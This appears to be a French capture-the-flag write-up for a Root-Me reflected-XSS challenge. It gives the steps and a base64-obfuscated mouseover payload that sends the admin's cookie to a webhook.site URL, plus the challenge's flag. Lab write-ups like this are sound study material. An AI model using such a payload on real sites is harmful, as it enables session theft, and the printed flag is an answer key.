---
title: 'XSS - Volatile'
description: "Exploitation d'une XSS réfléchie avancée avec événement mouseover"
pubDate: 'Jul 1 2025'
heroImage: 'https://static.actu.fr/uploads/2024/03/france-travail-cyberattaque-piratage-hackeurs.jpeg'
---

## 13. XSS - Volatile

**Objectif :** Voler le cookie de l'administrateur (administrateur sensibilisé à la sécurité)  
**Méthode :** XSS réfléchie via événement mouseover et exfiltration par webhook  
**Outils utilisés :** Webhook.site / injection de code / événements HTML  
**Temps :** 1h30  
**Flag :** `r3fL3ct3D_XsS_fTw`

### Solution

Exploitation d'une XSS réfléchie complexe sur un administrateur prudent qui ne clique pas sur les liens suspects.

![Challenge XSS Volatile](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2010.18.40.png)

**Étapes :**
1. Identifier le point de contact avec l'admin : signalement de pages inexistantes
2. Comprendre que l'admin ne cliquera pas sur les liens
3. Utiliser l'événement `mouseover` au lieu du clic
4. Encoder le payload en base64 pour éviter la détection
5. Injecter le payload :
   ```html
   <a href='?p=' onmouseover=eval(atob('bmV3IEltYWdlKCkuc3JjPSJodHRwczovL3dlYmhvb2suc2l0ZS9jYWE4NmEyMy03MmU1LTQ4N2MtYTk5ZC0wOWIwMjNiZjEwOTM/Y29va2llPSIrZG9jdW1lbnQuY29va2ll')) href=''>...</a>
   ```
6. Le simple survol déclenche l'exfiltration du cookie
7. Récupérer le cookie admin sur le webhook

![Analyse du comportement administrateur](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2010.20.11.png)

![Configuration avancée du webhook](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2011.05.41.png)

![Payload XSS avec mouseover](/src/assets/root_me/Capture%20d'écran%202025-07-01%20à%2011.06.18.png)
